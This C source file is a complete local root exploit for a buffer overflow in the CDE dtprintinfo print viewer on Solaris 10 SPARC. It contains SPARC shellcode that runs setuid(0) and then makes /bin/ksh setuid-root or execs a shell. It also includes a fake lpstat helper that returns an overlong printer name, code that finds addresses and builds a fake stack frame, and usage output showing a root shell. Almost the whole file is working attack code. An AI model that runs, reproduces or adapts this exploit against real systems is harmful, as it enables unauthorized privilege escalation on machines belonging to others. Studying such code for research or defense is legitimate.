/*
 * raptor_dtprintname_sparc3.c - dtprintinfo on Solaris 10 SPARC
 * Copyright (c) 2004-2020 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * 0day buffer overflow in the dtprintinfo(1) CDE Print Viewer, leading to
 * local root. Many thanks to Dave Aitel for discovering this vulnerability
 * and for his interesting research activities on Solaris/SPARC.
 *
 * "None of my dtprintinfo work is public, other than that 0day pack being
 * leaked to all hell and back. It should all basically still work. Let's
 * keep it that way, cool? :>" -- Dave Aitel
 *
 * This is a revised version of my original exploit that should work on 
 * modern Solaris 10 SPARC boxes. I had to figure out a new way to obtain 
 * the needed addresses that's hopefully universal (goodbye VOODOO macros!).
 * and I had to work around some annoying crashes, which led me to write
 * a custom shellcode that makes /bin/ksh setuid. Crude but effective;)
 * If you feel brave, you can also try my experimental exec shellcode, for
 * SPARC V8 plus and above architectures only ("It works on my computer!").
 *
 * I'm developing my exploits on a Solaris 10 Branded Zone and I strongly
 * suspect this is the reason for the weird behavior in the execution of
 * standard SYS_exec shellcodes, because the crash happens in s10_brand.so.1,
 * in the strncmp() function called by brand_uucopystr(). If that's indeed
 * the case, any shellcode (including lsd-pl.net's classic shellcode) should
 * work on physical systems and I just spent a non-neglibible amount of time
 * debugging this for no valid reason but my love of hacking... Oh well!
 *
 * Usage:
 * $ gcc raptor_dtprintname_sparc3.c -o raptor_dtprintname_sparc3 -Wall
 * [on your xserver: disable the access control]
 * $ ./raptor_dtprintname_sparc3 10.0.0.122:0
 * [...]
 * $ ls -l /bin/ksh
 * -rwsrwsrwx   3 root     bin       209288 Feb 21  2012 /bin/ksh
 * $ /bin/ksh
 * # id
 * uid=100(user) gid=1(other) euid=0(root) egid=2(bin)
 * #
 *
 * Tested on:
 * SunOS 5.10 Generic_Virtual sun4u sparc SUNW,SPARC-Enterprise (Solaris 10 1/13)
 */

#include <fcntl.h>
#include <link.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/systeminfo.h>

#define INFO1	"raptor_dtprintname_sparc3.c - dtprintinfo on Solaris 10 SPARC"
#define INFO2	"Copyright (c) 2004-2020 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN	"/usr/dt/bin/dtprintinfo"	// the vulnerable program
#define	BUFSIZE	301				// size of the printer name
#define	FFSIZE	64 + 1				// size of the fake frame
#define	DUMMY	0xdeadbeef			// dummy memory address

//#define USE_EXEC_SC				// uncomment to use exec shellcode

#ifdef USE_EXEC_SC
	char sc[] = /* Solaris/SPARC execve() shellcode (12 + 48 = 60 bytes) */
	/* setuid(0) */
	"\x90\x08\x3f\xff"	/* and	%g0, -1, %o0		*/
	"\x82\x10\x20\x17"	/* mov	0x17, %g1		*/
	"\x91\xd0\x20\x08"	/* ta	8			*/
	/* execve("/bin/ksh", argv, NULL) */
	"\x9f\x41\x40\x01"	/* rd	%pc,%o7	! >= sparcv8+	*/
	"\x90\x03\xe0\x28"	/* add	%o7, 0x28, %o0 		*/
	"\x92\x02\x20\x10"	/* add	%o0, 0x10, %o1		*/
	"\xc0\x22\x20\x08"	/* clr	[ %o0 + 8 ]		*/
	"\xd0\x22\x20\x10"	/* st	%o0, [ %o0 + 0x10 ]	*/
	"\xc0\x22\x20\x14"	/* clr	[ %o0 + 0x14 ]		*/
	"\x82\x10\x20\x0b"	/* mov	0xb, %g1		*/
	"\x91\xd0\x20\x08"	/* ta	8			*/
	"\x80\x1c\x40\x11"	/* xor	%l1, %l1, %g0 ! nop	*/
	"\x41\x41\x41\x41"	/* placeholder 			*/
	"/bin/ksh";
#else
	char sc[] = /* Solaris/SPARC chmod() shellcode (12 + 32 + 20 = 64 bytes) */
	/* setuid(0) */
	"\x90\x08\x3f\xff"	/* and	%g0, -1, %o0		*/
	"\x82\x10\x20\x17"	/* mov	0x17, %g1		*/
	"\x91\xd0\x20\x08"	/* ta	8			*/
	/* chmod("/bin/ksh", 037777777777) */
	"\x92\x20\x20\x01"	/* sub 	%g0, 1, %o1		*/
	"\x20\xbf\xff\xff"	/* bn,a	<sc - 4>		*/
	"\x20\xbf\xff\xff"	/* bn,a	<sc>			*/
	"\x7f\xff\xff\xff"	/* call	<sc + 4>		*/
	"\x90\x03\xe0\x20"	/* add	%o7, 0x20, %o0		*/
	"\xc0\x22\x20\x08"	/* clr	[ %o0 + 8 ]		*/
	"\x82\x10\x20\x0f"	/* mov  0xf, %g1		*/
	"\x91\xd0\x20\x08"	/* ta	8			*/
	/* exit(0) */
	"\x90\x08\x3f\xff"	/* and	%g0, -1, %o0		*/
	"\x82\x10\x20\x01"	/* mov	1, %g1			*/
	"\x91\xd0\x20\x08"	/* ta	8			*/
	"/bin/ksh";
#endif /* USE_EXEC_SC */

/* globals */
char	*arg[2] = {"foo", NULL};
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);
void	check_zero(int addr, char *pattern);
int	get_ff_addr(char *path, char **argv);
int	search_ldso(char *sym);
int	search_rwx_mem(void);
void	set_val(char *buf, int pos, int val);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char	buf[BUFSIZE], ff[FFSIZE], ret_var[16], fpt_var[16];
	char	platform[256], release[256], display[256];
	int	i, ff_addr, sc_addr, ret_pos, fpt_pos;

	int	sb = ((int)argv[0] | 0xffff) & 0xfffffffc;
	int	ret = search_ldso("sprintf");
	int	rwx_mem = search_rwx_mem() + 24; /* stable address */

	/* fake lpstat code */
	if (!strcmp(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			exit(1);

		/* get ret and fake frame addresses from environment */
		ret = (int)strtoul(getenv("RET"), (char **)NULL, 0);
		ff_addr = (int)strtoul(getenv("FPT"), (char **)NULL, 0);

		/* prepare the evil printer name */
		memset(buf, 'A', sizeof(buf));
		buf[sizeof(buf) - 1] = 0x0;

		/* fill with return and fake frame addresses */
		for (i = 0; i < BUFSIZE; i += 4) {
			/* apparently, we don't need to bruteforce */
			set_val(buf, i, ret - 4);
			set_val(buf, i += 4, ff_addr);
		}

		/* print the expected output and exit */
		if(!strcmp(argv[1], "-v")) {
			fprintf(stderr, "lpstat called with -v\n");
			printf("device for %s: /dev/null\n", buf);
		} else {
			fprintf(stderr, "lpstat called with -d\n");
			printf("system default destination: %s\n", buf);
		}
		exit(0);
	}

	/* helper program that prints argv[0] address, used by get_ff_addr() */
	if (!strcmp(argv[0], "foo")) {
		printf("0x%p\n", argv[0]);
		exit(0);
	}

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* process command line */
	if (argc != 2) {
#ifdef USE_EXEC_SC
		fprintf(stderr, "usage: %s xserver:display\n\n", argv[0]);
#else
		fprintf(stderr, "usage:\n$ %s xserver:display\n$ /bin/ksh\n\n", argv[0]);
#endif /* USE_EXEC_SC */
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);

	/* prepare the fake frame */
	bzero(ff, sizeof(ff));
	for (i = 0; i < 64; i += 4) {
		set_val(ff, i, DUMMY);
	}

	/* fill the envp, keeping padding */
	sc_addr = add_env(ff);
	add_env(sc);
	ret_pos = env_pos;
	add_env("RET=0x41414141"); /* placeholder */
	fpt_pos = env_pos;
	add_env("FPT=0x42424242"); /* placeholder */
	add_env(display);
	add_env("PATH=.:/usr/bin");
	add_env("HOME=/tmp");
	add_env(NULL);

	/* calculate the needed addresses */
	ff_addr = get_ff_addr(VULN, argv);
	sc_addr += ff_addr;

	/*
	 * populate saved %l registers
	 */
	set_val(ff, i  = 0, ff_addr + 56);	/* %l0 */
	set_val(ff, i += 4, ff_addr + 56);	/* %l1 */
	set_val(ff, i += 4, ff_addr + 56);	/* %l2 */
	set_val(ff, i += 4, ff_addr + 56);	/* %l3 */
	set_val(ff, i += 4, ff_addr + 56);	/* %l4 */
	set_val(ff, i += 4, ff_addr + 56);	/* %l5 */
	set_val(ff, i += 4, ff_addr + 56);	/* %l6 */
	set_val(ff, i += 4, ff_addr + 56);	/* %l7 */

	/*
	 * populate saved %i registers
	 */
	set_val(ff, i += 4, rwx_mem);		/* %i0: 1st arg to sprintf() */
	set_val(ff, i += 4, sc_addr);		/* %i1: 2nd arg to sprintf() */
	set_val(ff, i += 4, ff_addr + 56);	/* %i2 */
	set_val(ff, i += 4, ff_addr + 56);	/* %i3 */
	set_val(ff, i += 4, ff_addr + 56);	/* %i4 */
	set_val(ff, i += 4, ff_addr + 56);	/* %i5 */
	set_val(ff, i += 4, sb - 1024);		/* %i6: frame pointer */
	set_val(ff, i += 4, rwx_mem - 8);	/* %i7: return address */

#ifdef USE_EXEC_SC
	set_val(sc, 48, sb - 1024);		/* populate exec shellcode placeholder */
#endif /* USE_EXEC_SC */

	/* overwrite RET and FPT env vars with the correct addresses */
	sprintf(ret_var, "RET=0x%x", ret);
	env[ret_pos] = ret_var;
	sprintf(fpt_var, "FPT=0x%x", ff_addr);
	env[fpt_pos] = fpt_var;

	/* create a symlink for the fake lpstat */
	unlink("lpstat");
	symlink(argv[0], "lpstat");

	/* print some output */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using rwx_mem address\t: 0x%p\n", (void *)rwx_mem);
	fprintf(stderr, "Using sc address\t: 0x%p\n", (void *)sc_addr);
	fprintf(stderr, "Using ff address\t: 0x%p\n", (void *)ff_addr);
	fprintf(stderr, "Using sprintf() address\t: 0x%p\n\n", (void *)ret);

	/* check for null bytes (add some padding to env if needed) */
	check_zero(ff_addr, "ff address");
	check_zero(sc_addr, "sc address");

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(1);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return env_len;
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return env_len;
}

/*
 * check_zero(): check an address for the presence of a 0x00
 */
void check_zero(int addr, char *pattern)
{
	if (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
	    !(addr & 0xff000000)) {
		fprintf(stderr, "error: %s contains a 0x00!\n", pattern);
		exit(1);
	}
}

/*
 * get_ff_addr(): get fake frame address using a helper program
 */
int get_ff_addr(char *path, char **argv)
{
	char	prog[] = "./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	char	hex[11] = "\x00";
	int	fd[2], addr;

	/* truncate program name at correct length and create a hard link */
	prog[strlen(path)] = 0x0;
	unlink(prog);
	link(argv[0], prog);

	/* open pipe to read program output */
	if (pipe(fd) < 0) {
		perror("pipe");
		exit(1);
	}

	switch(fork()) {

	case -1: /* cannot fork */
		perror("fork");
		exit(1);

	case 0: /* child */
		dup2(fd[1], 1);
		close(fd[0]);
		close(fd[1]);
		execve(prog, arg, env);
		perror("execve");
		exit(1);

	default: /* parent */
		close(fd[1]);
		read(fd[0], hex, sizeof(hex));
		break;
	}

	/* check and return address */
	if (!(addr = (int)strtoul(hex, (char **)NULL, 0))) {
		fprintf(stderr, "error: cannot read ff address from helper program\n");
		exit(1);
	}
	return addr + 4;
}

/*
 * search_ldso(): search for a symbol inside ld.so.1
 */
int search_ldso(char *sym)
{
	int		addr;
	void		*handle;
	Link_map	*lm;

	/* open the executable object file */
	if ((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL) {
		perror("dlopen");
		exit(1);
	}

	/* get dynamic load information */
	if ((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1) {
		perror("dlinfo");
		exit(1);
	}

	/* search for the address of the symbol */
	if ((addr = (int)dlsym(handle, sym)) == NULL) {
		fprintf(stderr, "error: sorry, function %s() not found\n", sym);
		exit(1);
	}

	/* close the executable object file */
	dlclose(handle);

	check_zero(addr - 4, sym);
	return addr;
}

/*
 * search_rwx_mem(): search for an RWX memory segment valid for all
 * programs (typically, /usr/lib/ld.so.1) using the proc filesystem
 */
int search_rwx_mem(void)
{
	int	fd;
	char	tmp[16];
	prmap_t	map;
	int	addr = 0, addr_old;

	/* open the proc filesystem */
	sprintf(tmp,"/proc/%d/map", (int)getpid());
	if ((fd = open(tmp, O_RDONLY)) < 0) {
		fprintf(stderr, "error: can't open %s\n", tmp);
		exit(1);
	}

	/* search for the last RWX memory segment before stack (last - 1) */
	while (read(fd, &map, sizeof(map)))
		if (map.pr_vaddr)
			if (map.pr_mflags & (MA_READ | MA_WRITE | MA_EXEC)) {
				addr_old = addr;
				addr = map.pr_vaddr;
			}
	close(fd);

	/* add 4 to the exact address null bytes */
	if (!(addr_old & 0xff))
		addr_old |= 0x04;
	if (!(addr_old & 0xff00))
		addr_old |= 0x0400;

	return addr_old;
}

/*
 * set_val(): copy a dword inside a buffer
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =	(val & 0xff000000) >> 24;
	buf[pos + 1] =	(val & 0x00ff0000) >> 16;
	buf[pos + 2] =	(val & 0x0000ff00) >> 8;
	buf[pos + 3] =	(val & 0x000000ff);
}
